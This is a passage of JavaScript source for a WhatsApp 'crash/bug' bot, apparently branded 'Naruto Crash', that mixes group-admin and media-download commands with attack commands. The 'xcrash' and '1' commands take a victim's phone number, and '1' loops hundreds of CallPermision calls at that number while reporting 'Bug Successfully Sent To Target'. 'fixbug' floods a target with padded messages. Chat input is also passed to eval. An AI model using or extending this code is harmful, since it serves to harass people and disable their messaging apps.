                   { title: "🎰", description: "𝕺𝖕𝖊𝖓 𝕿𝖔 𝕴𝖜𝖓𝖊𝖗", id: ".owner" }
                 ]
               }
             ]
           })
         },
         viewOnce: true
       }
     ];
     buttonMessage.buttons.push(...flowActions);
     await X.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;
        
case 'xcrash': {
let t = text.split(' ');
    if (!q) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "");
 const emojis = ['🎭', '🎰', '✅'];
 let count = 0;

 const sendEmojiReactions = async () => {
   if (count < 3) {
     await X.sendMessage(m.chat, {
       react: {
         text: emojis[count % emojis.length],
         key: m.key,
       },
     });

     count++;
     setTimeout(sendEmojiReactions, 100);
   } else {
     let menu = `
*_𝐓𝐀𝐑𝐆𝐄𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐋𝐎𝐂𝐊𝐄𝐃🐔_*
*_${global.p}𝕻𝖑𝖊𝖆𝖘𝖊 𝖘𝖊𝖑𝖊𝖈𝖙 𝖙𝖍𝖊 𝖇𝖚𝖌 𝖙𝖞𝖕𝖊 𝖇𝖊𝖑𝖔𝖜${global.p}_*
 ━━━━━━━━━━━━━━━━━━━━━
*_안 쿠이엑스슈퍼_* 🐉
`;

     let buttons = [
       { buttonId: `.1 ${pepec}`, buttonText: { displayText: "𝖃𝖘𝖚𝖕𝖊𝖗𝕭𝖊𝖙𝖆🐔" } }
     ];

     let buttonMessage = {
       video: {
         url: 'https://files.catbox.moe/cqoiif.mp4' 
       },
       caption: `${menu}`,
       gifPlayback: true,
       gifAttribution: 1,
       contextInfo: {
         mentionedJid: [m.sender],
         externalAdReply: {
           showAdAttribution: true,
           title: '𐙚 Brayen Official 🕊',
           body: 'Naruto Crash',
           thumbnailUrl: global.urlfoto,
           sourceUrl: global.url,
           mediaType: 1,
           XderLargerThumbnail: true
         },
         forwardedNewsletterMessageInfo: {
           newsletterJid: '0@newsletter',
           newsletterName: 'Brayen Official 🕊',
           serverMessageId: -1
         }
       },
       footer: "Naruto Crash",
       buttons: buttons,
       viewOnce: true,
       headerType: 6
     };
     buttonMessage.buttons.push;
     await X.sendMessage(m.chat, buttonMessage, { quoted: fkontak });
   }
 };
 sendEmojiReactions();
};
break;


case 'fixbug': {
if (!isPrem) return replygw('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ')
if (!q) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} 628×××`)
let pepec = q.replace(/[^0-9]/g, "")
if (pepec.startsWith('0')) return replygw(`• ɴᴏᴍᴏʀ ᴅɪᴍᴜʟᴀɪ ᴅᴇɴɢᴀɴ ᴀɴɢᴋᴀ 0. ɢᴀɴᴛɪʟᴀʜ ᴅᴇɴɢᴀɴɴʏᴀ ɴᴏᴍᴏʀ ʏᴀɴɢ ʙᴇʀᴀᴡᴀʟᴀɴ ᴋᴏᴅᴇ ɴᴇɢᴀʀᴀ\n\nᴇxᴀᴍᴘʟᴇ : ${prefix + command} 628×××`)
let target = pepec + '@s.whatsapp.net'
for (let i = 0; i < 3; i++) {
await X.sendMessage(target, {text: "ᴜɴʟᴏᴄᴋ sᴜᴄᴄᴇsғᴜʟʟʏ  )\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
});
}
replygw("sᴜᴄᴄᴄᴇsғᴜʟʟʏ ᴄʟᴇᴀʀ ʙᴜɢ");
}
break

case "public": {
if (!isOwner) return replygw('ᴏɴʟʏ ᴏᴡɴᴇʀ')
X.public = true
replygw('*sᴜᴄᴄᴇss ᴄʜᴀɴɢᴇs ᴛᴏ ᴘᴜʙʟɪᴄ*');
}
break

case "self": {
if (!isOwner) return replygw('ᴏɴʟʏ ᴏᴡɴᴇʀ')
X.public = false
replygw('*sᴜᴄᴄᴇss ᴄʜᴀɴɢᴇs ᴛᴏ sᴇʟғ*');
}
break

case "addmurbug": {
if (!isOwner) return replygw(`ᴏɴʟʏ ᴏᴡɴᴇʀ`)
if (!args[0]) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} ɴᴏᴍᴏʀ\nᴄᴏɴᴛᴏʜ ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await X.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygw(`ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ʏᴀɴɢ ᴠᴀʟɪᴅ ᴅᴀɴ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./lib/database/premium.json', JSON.stringify(kontributor))
replygw(`ɴᴜᴍʙᴇʀ ${bnnd} sᴜᴄᴄᴇssғᴜʟ ᴜᴘɢʀᴀᴅᴇ !!!`);
}
break

case "delmurbug": {
    if (!isOwner) return replygw("ᴏɴʟʏ ᴏᴡɴᴇʀ");
    if (!args[0]) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} ɴᴏᴍᴏʀ\nᴄᴏɴᴛᴏʜ ${prefix + command} 628×××`);
    target = q.split("|")[0].replace(/[^0-9]/g, '');
    unp = kontributor.indexOf(target);
    kontributor.splice(unp, 1);
    fs.writeFileSync('./lib/database/premium.json', JSON.stringify(kontributor));
    replygw(`ɴᴜᴍʙᴇʀ ${target} sᴜᴄᴄᴇsғᴜʟʟʏ ᴅᴇʟᴇᴛᴇ !!!`);
}
break;

case "addowner": {
if (!isOwner) return replygw(`ᴏɴʟʏ ᴏᴡɴᴇʀ`)
if (!args[0]) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} ɴᴏᴍᴏʀ\nᴄᴏɴᴛᴏʜ ${prefix + command} 628×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await X.onWhatsApp(bnnd)
if (ceknye.length == 0) return replygw(`ᴍᴀsᴜᴋᴋᴀɴ ɴᴏᴍᴏʀ ʏᴀɴɢ ᴠᴀʟɪᴅ ᴅᴀɴ ᴛᴇʀᴅᴀғᴛᴀʀ ᴅɪ ᴡʜᴀᴛsᴀᴘᴘ !!!`)
kontributor.push(bnnd)
fs.writeFileSync('./lib/database/owner.json', JSON.stringify(kontributor))
replygw(`ɴᴜᴍʙᴇʀ ${bnnd} sᴜᴄᴄᴇssғᴜʟ ᴜᴘɢʀᴀᴅᴇ !!!`);
}
break

case "delowner": {
    if (!isOwner) return replygw("ᴏɴʟʏ ᴏᴡɴᴇʀ");
    if (!args[0]) return replygw(`ᴘᴇɴɢɢᴜɴᴀᴀɴ ${prefix + command} ɴᴏᴍᴏʀ\nᴄᴏɴᴛᴏʜ ${prefix + command} 628×××`);
    target = q.split("|")[0].replace(/[^0-9]/g, '');
    unp = kontributor.indexOf(target);
    kontributor.splice(unp, 1);
    fs.writeFileSync('./lib/database/owner.json', JSON.stringify(kontributor));
    replygw(`ɴᴜᴍʙᴇʀ ${target} sᴜᴄᴄᴇsғᴜʟʟʏ ᴅᴇʟᴇᴛᴇ !!!`);
}
break;

case "setjeda": {
    if (!isOwner) return replygw('ᴏɴʟʏ ᴏᴡɴᴇʀ');
    if (!q || isNaN(q)) return replygw(`❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: ${prefix + command} <menit>\n\nContoh: ${prefix + command} 10`);
    cooldownTime = parseInt(q) * 60 * 1000;
    replygw(`✅ Jeda waktu berhasil diubah menjadi ${q} menit.`);
}
break;

case "1": {
    if (!isPrem && !isOwner) return replygw('ᴏɴʟʏ ᴘʀᴇᴍɪᴜᴍ & ᴏᴡɴᴇʀ');
    if (!q) return replygw(`❓ *ᴘᴇɴɢɢᴜɴᴀᴀɴ*: ${prefix + command} 628×××`);

    let pepec = q.replace(/[^0-9]/g, "");
    if (pepec.startsWith('0')) return replygw(`• Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n*Example*: ${prefix + command} 628×××`);

    let target = pepec + '@s.whatsapp.net';

    let lastUsed = cooldowns[m.sender];
    if (lastUsed && (Date.now() - lastUsed < cooldownTime)) {
        let remainingTime = Math.ceil((cooldownTime - (Date.now() - lastUsed)) / 1000);
        return replygw(`⏳ Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    let prosesText = "*_𝕻𝖗𝖔𝖈𝖊𝖘𝖘 𝖔𝖋 𝕾𝖊𝖓𝖉𝖎𝖓𝖌 𝕭𝖚𝖌 𝕸𝖊𝖘𝖘𝖆𝖌𝖊𝖘 𝖙𝖔 𝕿𝖆𝖗𝖌𝖊𝖙_*";
    let selesaiText = `*_${global.p}𝕭𝖚𝖌 𝕾𝖚𝖈𝖈𝖊𝖘𝖘𝖋𝖚𝖑𝖑𝖞 𝕾𝖊𝖓𝖙 𝕿𝖔 𝕿𝖆𝖗𝖌𝖊𝖙 !!${global.p}_*\n> *_𝙿𝚕𝚎𝚊𝚜𝚎 𝚙𝚊𝚞𝚜𝚎 𝚏𝚘𝚛 5 𝚖𝚒𝚗𝚞𝚝𝚎𝚜 𝚝𝚘 𝚊𝚟𝚘𝚒𝚍 𝚜𝚙𝚊𝚖_*`;

    await X.sendMessage(m.chat, {
        text: prosesText,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `𝕬𝖜𝖆𝖎𝖙 𝕬𝖙𝖙𝖆𝖈𝖐𝖎𝖓𝖌`,
                body: 'Naruto Crash',
                thumbnailUrl: global.urlfoto,
                sourceUrl: global.url
            }
        }
    }, { quoted: fkontak });

    for (let i = 0; i < 100; i++) {
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        await CallPermision(target)
        
    }

    await X.sendMessage(m.chat, {
        text: selesaiText,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: '𐙚 Brayen Official 🕊',
                body: 'Naruto Crash',
                thumbnailUrl: global.urlfoto,
                sourceUrl: global.url
            }
        }
    }, { quoted: fkontak });
    cooldowns[m.sender] = Date.now();
}
break;

case 'owner': {
  const ownerNumber = '6285137684811';
  const ownerName = 'Brayen Official';

  const vCard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;waid=${ownerNumber}:${ownerNumber}
END:VCARD`;

  await X.sendMessage(m.chat, {
    contacts: {
      displayName: ownerName,
      contacts: [{ vcard: vCard }],
    },
  });

  await X.sendMessage(m.chat, { text: 'Hay ka ini owner ku ya, jangan spam ya!' }, { quoted: m });
};
break;

case 'kick': {
 if (!m.isGroup) return replygw('Khusus Group');
 if (!isOwner&& !m.isAdmin) return replygw('Khusus Admin')
 let userToKick = m.mentionedJid[0];
 if (!userToKick) return m.reply("Tag pengguna yang ingin dikeluarkan!");
 try {
 await X.groupParticipantsUpdate(m.chat, [userToKick], 'remove');
 replygw(`Pengguna @${userToKick.split('@')[0]} berhasil dikeluarkan dari grup.`, null, { mentions: [userToKick] });
 } catch (error) {
 console.error(error);
 m.reply("Gagal mengeluarkan pengguna dari grup.");
 }
}
break

case 'linkgc':
{
 if (!m.isGroup) return replygw("Perintah ini hanya dapat digunakan di grup.");
 if (!isOwner && !m.isAdmin) return replygw("Perintah ini hanya untuk admin grup.");
 try {
 const groupMetadata = await X.groupMetadata(m.chat);
 if (!groupMetadata) throw "Gagal mendapatkan metadata grup.";
 const inviteCode = await X.groupInviteCode(m.chat);
 const groupLink = `https://chat.whatsapp.com/${inviteCode}`;
 m.reply(`┌───「 *Brayen Official 🕊* 」───
│ *Link Group* : ${groupLink}
└───────────────────`);
 } catch (err) {
 console.error(err);
 replygw("Gagal mendapatkan link grup. Pastikan bot adalah admin dan grup memiliki kode undangan aktif.");
 }
}
break;

 case 'add': {
if (!m.isGroup) return replygw('Khusus group');
if (!isOwner && !isAdmins) return replygw('Khusus Admin');
if (!isBotAdmins) return replygw('Bot Bukan Admin');
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await X.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (memberJids.includes(users)) {
m.reply('Target sudah menjadi anggota grup sebelumnya.');
} else {
await X.groupParticipantsUpdate(m.chat, [users], 'add');
replygw('Sukses add target.');
}} catch (err) {
replygw('Terjadi kesalahan.');
}}
break
        
case 'promote': {
if (!m.isGroup) return replygw('khusus group')
if (!isOwner && !isAdmins) return replygw ('khusus admin')
if (!isBotAdmins) return replygw('bot bukan admin')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await X.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => replygw('Sukses promote target')).catch((err) => replygw('Terjadi kesalahan'))
}
break

case 'demote':
{
if (!m.isGroup) return replygw('khusus group')
if (!isOwner && !isAdmins) return replygw('Khusus Admin')
if (!isBotAdmins) return replygw('Bot Bukan Admin');
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await X.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => replygw('Sukses demote target')).catch((err) => replygw('Terjadi kesalahan'))
}
break

case 'open': 
case 'buka': {
if (!m.isGroup) return replygw('khusus group')
if (!isOwner && !isAdmins) return replygw('Khusus Admin')
if (!isBotAdmins) return replygw('Bot Bukan Admin');
X.groupSettingUpdate(m.chat, 'not_announcement')
replygw(`Sukses membuka grup`)
}
break

case 'close': 
case 'tutup': {
if (!m.isGroup) return replygw('khusus group')
if (!isOwner && !isAdmins) return replygw('Khusus Admin')
if (!isBotAdmins) return replygw('Bot Bukan Admin');
X.groupSettingUpdate(m.chat, 'announcement')
replygw(`Sukses menutup grup`)
}
break 
        
case 'play': {
 if (!text) return replygw('Example: Masih hatiku');
 replygw('_Waittt Sedang Kami Proses..._')
 try {
let search = require("yt-search");
let { youtube } = require("btch-downloader");
 const look = await search(text);
 const convert = look.videos[0];
 if (!convert) return reply('Video/Audio Tidak Ditemukan');
 if (convert.seconds >= 3600) {
 return replygw(m.chat, 'Video is longer than 1 hour!');
 } else {
 let audioUrl;
 try {
 audioUrl = await youtube(convert.url);
 } catch (e) {
 replygw(mess.wait)
 audioUrl = await youtube(convert.url);
 }

 await X.sendMessage(m.chat, {
 audio: {
 url: audioUrl.mp3
 },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: convert.title,
 body: "",
 thumbnailUrl: convert.image,
 sourceUrl: audioUrl.mp3,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: m
 });
 }
 } catch (e) {
 reply(m.chat, `*Error:* ` + e.message);
 }
};
break 
        
case 'mediafire':{
if (!text) return replygw(`Contoh: ${prefix+command} linknya ${pushname} ?`)

 let donlot = await mediafire(text);
 let result = donlot.data;

 const fileType = result.mimetype || await getFileTypeFromUrl(result.link);
 const fileName = result.filename || path.basename(result.link);

 if (fileType === "application/zip" || fileType === "application/pdf" || fileType === "application/vnd.ms-excel") {
 X.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 },{quoted:m});
 } else if (fileType.startsWith("image/")) {
 X.sendMessage(m.chat, { 
 image: { url: result.link },
 caption: fileName 
 },{quoted:m});
 } else if (fileType.startsWith("audio/")) {
 X.sendMessage(m.chat, { 
 audio: { url: result.link },
 mimetype: fileType,
 ptt: true // Push-to-talk untuk audio
 },{quoted:m});
 } else if (fileType.startsWith("video/")) {
 X.sendMessage(m.chat, { 
 video: { url: result.link },
 caption: fileName 
 });
 } else {
 X.sendMessage(m.chat, { 
 document: { url: result.link },
 fileName: fileName,
 mimetype: fileType 
 },{quoted:m});
 }
 }
 break
default:
if (budy.startsWith('>')) {
if (!isAcces) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isAcces) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});